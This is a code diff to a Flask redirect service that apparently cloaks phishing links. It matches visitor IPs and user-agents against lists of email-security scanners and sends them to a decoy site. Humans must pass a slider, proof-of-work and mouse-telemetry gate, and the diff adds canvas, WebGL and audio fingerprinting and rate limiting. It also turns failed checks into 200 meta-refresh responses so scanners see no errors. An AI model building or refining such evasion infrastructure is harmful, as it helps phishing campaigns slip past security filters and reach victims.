@@ -1,13 +1,15 @@
 import os
 import time
 import json
+import hmac
+import hashlib
 import secrets
 import base64
-import hashlib
 import logging
 from ipaddress import ip_address, ip_network
 from urllib.parse import quote
 
+import httpx
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from flask import (
     Flask, request, redirect, render_template_string,
@@ -24,6 +26,12 @@ AES_KEY = bytes.fromhex(AES_KEY_HEX)
 
 GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
 UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.xfinity.com")
+
+FP_RATE_LIMIT = int(os.environ.get("FP_RATE_LIMIT", "2"))
+FP_RATE_WINDOW = int(os.environ.get("FP_RATE_WINDOW", "60"))
+
+KV_URL = os.environ.get("KV_REST_API_URL", "")
+KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")
 
 app = Flask(__name__)
 app.secret_key = SK.encode()
@@ -52,7 +60,6 @@ MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
 BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
 TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
 GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
-
 YAHOO_AOL = [
     ip_network("66.163.160.0/19"), ip_network("74.6.0.0/16"),
     ip_network("98.136.0.0/14"), ip_network("98.137.0.0/16"),
@@ -60,20 +67,13 @@ YAHOO_AOL = [
     ip_network("98.140.0.0/14"), ip_network("108.160.160.0/20"),
     ip_network("188.125.64.0/19"), ip_network("203.84.192.0/19"),
 ]
-
 VERIZON = [
     ip_network("72.52.0.0/14"), ip_network("96.16.0.0/12"), ip_network("108.6.0.0/16"),
 ]
-
 SCANNER_NETS = {
-    "microsoft_eop": EOP, 
-    "proofpoint": PROOFPOINT, 
-    "mimecast": MIMECAST,
-    "barracuda": BARRACUDA, 
-    "cisco_talos": TALOS, 
-    "google_safebrowsing": GOOGLE_SAFEBROWSING,
-    "yahoo_aol": YAHOO_AOL,
-    "verizon": VERIZON,
+    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
+    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "yahoo_aol": YAHOO_AOL, "verizon": VERIZON,
     "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
     "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
     "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
@@ -81,7 +81,6 @@ SCANNER_NETS = {
     "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
     "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
 }
-
 SCANNER_UA_TOKENS = (
     "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", "mimecast",
     "barracuda", "talos", "ironport", "forcepoint", "symantec", "messagelabs", "trendmicro",
@@ -107,12 +106,10 @@ def client_ip() -> str:
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
     low = ua.lower()
-    
     try:
         a = ip_address(ip)
     except ValueError:
         a = None
-        
     if a is not None:
         for name, nets in SCANNER_NETS.items():
             if any(a in n for n in nets):
@@ -120,7 +117,6 @@ def classify(ip: str, ua: str) -> dict:
                 out["source"] = name
                 out["method"] = "ip"
                 return out
-                
     if not out["scanner"]:
         for tok in SCANNER_UA_TOKENS:
             if tok in low:
@@ -128,7 +124,6 @@ def classify(ip: str, ua: str) -> dict:
                 out["source"] = tok
                 out["method"] = "ua"
                 return out
-                
     return out
 
 def unseal_payload(blob):
@@ -151,12 +146,48 @@ def unseal_payload(blob):
         log.error(f"Failed to decrypt payload: {e}")
         return None
 
+def fp_rate_limit(fp_hash: str) -> bool:
+    if not KV_URL or not KV_TOKEN or not fp_hash:
+        return False
+    key = f"fp:{fp_hash}"
+    try:
+        with httpx.Client(timeout=3.0) as c:
+            r = c.post(
+                f"{KV_URL}/incr/{key}",
+                headers={"Authorization": f"Bearer {KV_TOKEN}"},
+                params={"EX": str(FP_RATE_WINDOW)},
+            )
+            r.raise_for_status()
+            count = int(r.json().get("result") or 0)
+            log.info(json.dumps({"event": "fp_rate", "fp": fp_hash[:16], "n": count}))
+            return count > FP_RATE_LIMIT
+    except Exception as e:
+        log.error(json.dumps({"event": "fp_rate_failed", "err": str(e)}))
+        return False
+
 def _static_page(title: str, text: str, status_code: int):
     html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
     return make_response(html, status_code)
 
+# --- NEW: Redirect with 200 OK ---
+def _meta_redirect(url: str):
+    """Returns a 200 OK response with an HTML meta refresh to the target URL."""
+    html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <meta http-equiv="refresh" content="0; url={url}">
+        <title>Redirecting...</title>
+    </head>
+    <body>
+        <script>window.location.href = "{url}";</script>
+        <p>Redirecting to <a href="{url}">{url}</a></p>
+    </body>
+    </html>"""
+    resp = make_response(html, 200)
+    return resp
+
 # ---------------------------------------------------------------------------
-# LANDING PAGE (With PoW, Telemetry, and Mouse Coordinates)
+# LANDING PAGE
 # ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en">
@@ -207,48 +238,96 @@ LANDING = """<!DOCTYPE html>
         const text = document.getElementById('slider-text');
         const successText = document.getElementById('success-text');
         const form = document.getElementById('challenge-form');
-        
-        let isDragging = false; 
-        let startX = 0; 
-        let maxDelta = 0;
-        let dragStartTime = 0;
-        let dragEvents = 0;
-        let coordinates = []; 
+
+        let isDragging = false; let startX = 0; let maxDelta = 0;
+        let dragStartTime = 0; let dragEvents = 0; let coordinates = [];
 
         function init() { maxDelta = container.offsetWidth - handle.offsetWidth - 10; }
-        window.onload = init; window.onresize = init;
+        window.onload = () => { init(); bindFingerprint(); };
+        window.onresize = init;
 
-        handle.addEventListener('mousedown', startDrag); 
+        handle.addEventListener('mousedown', startDrag);
         handle.addEventListener('touchstart', startDrag, {passive: true});
-        document.addEventListener('mousemove', onDrag); 
+        document.addEventListener('mousemove', onDrag);
         document.addEventListener('touchmove', onDrag, {passive: false});
-        document.addEventListener('mouseup', endDrag); 
+        document.addEventListener('mouseup', endDrag);
         document.addEventListener('touchend', endDrag);
 
-        function startDrag(e) { 
-            isDragging = true; 
-            dragStartTime = Date.now();
-            dragEvents = 0;
-            coordinates = []; 
-            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
+        async function computeFingerprint() {
+            const parts = [];
+            parts.push(screen.width + "x" + screen.height + "x" + screen.colorDepth);
+            parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
+            parts.push(navigator.hardwareConcurrency || 0);
+            parts.push(navigator.platform || "");
+            parts.push(Array.from(navigator.languages || []).join(","));
+
+            try {
+                const canvas = document.createElement("canvas");
+                canvas.width = 200; canvas.height = 40;
+                const ctx = canvas.getContext("2d");
+                ctx.textBaseline = "top";
+                ctx.font = "16px Arial";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(0, 0, 100, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("fingerprint-αβγ-123", 2, 15);
+                parts.push(canvas.toDataURL().slice(-64));
+            } catch (e) {}
+
+            try {
+                const gl = document.createElement("canvas").getContext("webgl");
+                const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+                if (dbg) {
+                    parts.push(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + "|" + gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
+                }
+            } catch (e) {}
+
+            try {
+                const ctx = new OfflineAudioContext(1, 44100, 44100);
+                const osc = ctx.createOscillator();
+                osc.type = "triangle";
+                osc.frequency.value = 1000;
+                osc.connect(ctx.destination);
+                osc.start(0);
+                const buf = await ctx.startRendering();
+                let sum = 0;
+                for (let i = 0; i < buf.length; i += 100) sum += Math.abs(buf.getChannelData(0)[i]);
+                parts.push(Math.round(sum).toString());
+            } catch (e) {}
+
+            const raw = parts.join("||");
+            const hashBuf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
+            return Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2, "0")).join("");
+        }
+
+        async function bindFingerprint() {
+            const fp = await computeFingerprint();
+            try {
+                await fetch("/fingerprint", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    credentials: "same-origin",
+                    body: JSON.stringify({ fp: fp })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        function startDrag(e) {
+            isDragging = true; dragStartTime = Date.now(); dragEvents = 0; coordinates = [];
+            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
         }
 
         function onDrag(e) {
             if (!isDragging) return;
             if (e.cancelable) e.preventDefault();
             dragEvents++;
-            
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
             const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
-            
             coordinates.push({x: clientX, y: clientY});
-            
             let deltaX = clientX - startX;
             if (deltaX < 0) deltaX = 0; if (deltaX > maxDelta) deltaX = maxDelta;
-            
             handle.style.left = (5 + deltaX) + 'px';
             progress.style.width = ((deltaX + 40) / container.offsetWidth * 100) + '%';
-            
             if (deltaX >= maxDelta - 2) { completeVerification(); }
         }
 
@@ -262,15 +341,12 @@ LANDING = """<!DOCTYPE html>
         }
 
         async function completeVerification() {
-            isDragging = false; 
-            
+            isDragging = false;
             const dragDuration = Date.now() - dragStartTime;
-            
             if (dragDuration < 200 || dragEvents < 5) {
                 document.getElementById("slider-text").innerText = "Automation detected. Try again.";
-                handle.style.left = '5px';
-                progress.style.width = '0%';
-                return; 
+                handle.style.left = '5px'; progress.style.width = '0%';
+                return;
             }
 
             handle.style.background = '#48bb78';
@@ -278,8 +354,7 @@ LANDING = """<!DOCTYPE html>
             handle.style.cursor = 'default'; text.style.opacity = '0'; successText.style.display = 'block';
 
             const seed = "{{ challenge }}";
-            let nonce = 0;
-            let hash = "";
+            let nonce = 0; let hash = "";
             while (!hash.startsWith("0000")) {
                 nonce++;
                 const data = new TextEncoder().encode(seed + nonce);
@@ -292,16 +367,13 @@ LANDING = """<!DOCTYPE html>
             document.getElementById("drag_time").value = dragDuration;
             document.getElementById("drag_events").value = dragEvents;
             document.getElementById("mouse_coords").value = JSON.stringify(coordinates);
-            
+
             form.submit();
         }
     </script>
 </body>
 </html>"""
 
-# ---------------------------------------------------------------------------
-# routes
-# ---------------------------------------------------------------------------
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": int(time.time())})
@@ -314,98 +386,124 @@ def root():
 def landing(token: str):
     if not token.startswith("click_upn="):
         return _static_page("Invalid link", "This link is not valid.", 404)
-        
     eop_token = token.replace("click_upn=", "")
     data = unseal_payload(eop_token)
-    
     if not data or "target" not in data:
         return _static_page("Invalid link", "Could not decrypt target.", 404)
 
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     log.info(json.dumps({"event": "landing_get", **tag}))
-
+    
+    # If it's a scanner, send to unwanted URL with a 302
     if tag["scanner"]:
         unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
         log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
         return redirect(unwanted, code=302)
 
     challenge_seed = secrets.token_hex(16)
-    
-    nonce_payload = {"t": eop_token, "ts": time.time(), "challenge": challenge_seed}
+    nonce_payload = {"t": eop_token, "ts": time.time(), "challenge": challenge_seed, "fp": ""}
     nonce_blob = cookie_serializer.dumps(nonce_payload)
 
     html = render_template_string(
-        LANDING, 
-        action=f"/submit/{quote(eop_token)}", 
-        token=eop_token, 
-        nonce=nonce_blob,
-        challenge=challenge_seed
+        LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token,
+        nonce=nonce_blob, challenge=challenge_seed,
     )
-    
     resp = make_response(html)
-    
     is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
     resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
     return resp
 
+@app.route("/fingerprint", methods=["POST"])
+def bind_fingerprint():
+    cookie_val = request.cookies.get("gate_session", "")
+    if not cookie_val:
+        return jsonify({"error": "no session"}), 401
+    try:
+        nonce_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
+    except Exception:
+        return jsonify({"error": "invalid session"}), 401
+
+    body = request.get_json(silent=True) or {}
+    fp_hash = (body.get("fp") or "").strip()
+    if not fp_hash or len(fp_hash) != 64:
+        return jsonify({"error": "bad fp"}), 400
+
+    nonce_data["fp"] = fp_hash
+    new_blob = cookie_serializer.dumps(nonce_data)
+
+    resp = jsonify({"ok": True})
+    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
+    resp.set_cookie("gate_session", new_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
+    return resp
+
 @app.route("/submit/<path:token>", methods=["POST"])
 def execute(token: str):
+    # For ANY verification failure below, we use _meta_redirect to send a 200 OK
+    # with a meta refresh, instead of a 400 Bad Request.
+    unwanted = UNWANTED_REDIRECT_URL
+    
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     if tag["scanner"]:
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return _meta_redirect(unwanted)
 
-    submitted_blob = request.form.get("n", "")
-    if not submitted_blob:
-        return _static_page("Missing Context", "Verification payload missing.", 400)
+    cookie_val = request.cookies.get("gate_session", "")
+    if not cookie_val:
+        return _meta_redirect(unwanted)
 
     try:
-        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
-    except:
-        return _static_page("Session Expired", "Verification context expired.", 400)
+        nonce_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
+    except Exception:
+        return _meta_redirect(unwanted)
 
-    if not secrets.compare_digest(nonce_data.get("t", ""), token):
-        return _static_page("Verification Failed", "Verification payload mismatched.", 400)
+    if not hmac.compare_digest(nonce_data.get("t", ""), token):
+        return _meta_redirect(unwanted)
 
-    # 1. Check Proof of Work
+    cookie_fp = nonce_data.get("fp", "")
+    if not cookie_fp:
+        return _meta_redirect(unwanted)
+
+    # PoW
     submitted_pow = request.form.get("pow_nonce", "")
     seed = nonce_data.get("challenge", "")
-    
     if not seed or not submitted_pow:
-        return _static_page("Verification Failed", "Missing PoW data.", 400)
-
+        return _meta_redirect(unwanted)
+        
     test_hash = hashlib.sha256((seed + submitted_pow).encode()).hexdigest()
     if not test_hash.startswith("0000"):
-        return _static_page("Verification Failed", "Invalid PoW.", 400)
+        return _meta_redirect(unwanted)
 
-    # 2. Check Telemetry & Mouse Variance
+    # Telemetry
     drag_time = int(request.form.get("drag_time", 0))
     drag_events = int(request.form.get("drag_events", 0))
     coords_json = request.form.get("mouse_coords", "[]")
-
+    
     if drag_time < 200 or drag_events < 5:
-        return _static_page("Verification Failed", "Automated behavior detected.", 400)
-
+        return _meta_redirect(unwanted)
+        
     try:
         coords = json.loads(coords_json)
         if len(coords) > 1:
-            # Calculate Y-axis variance (human hand shakes vertically while dragging horizontally)
-            y_values = [c['y'] for c in coords]
+            y_values = [c["y"] for c in coords]
             mean_y = sum(y_values) / len(y_values)
             variance_y = sum((y - mean_y) ** 2 for y in y_values) / len(y_values)
-            
-            # If variance is exactly 0, it was a perfectly straight line (bot)
             if variance_y == 0:
-                return _static_page("Verification Failed", "Linear movement detected.", 400)
+                return _meta_redirect(unwanted)
         else:
-            return _static_page("Verification Failed", "Not enough movement data.", 400)
+            return _meta_redirect(unwanted)
     except Exception:
-        return _static_page("Verification Failed", "Malformed telemetry data.", 400)
+        return _meta_redirect(unwanted)
 
-    # If all checks pass, execute redirect
+    # Fingerprint rate limit
+    if fp_rate_limit(cookie_fp):
+        log.info(json.dumps({"event": "fp_rate_blocked", "fp": cookie_fp[:16]}))
+        return _meta_redirect(unwanted)
+
+    # All checks pass → decrypt target and redirect the real user
     data = unseal_payload(token)
     if not data or "target" not in data:
-         return _static_page("Invalid link", "Could not decrypt target.", 404)
+        return _meta_redirect(unwanted)
 
+    # Real target redirect (normal 303)
     resp = make_response(redirect(data["target"], code=303))
     resp.delete_cookie("gate_session", path="/")
     return resp
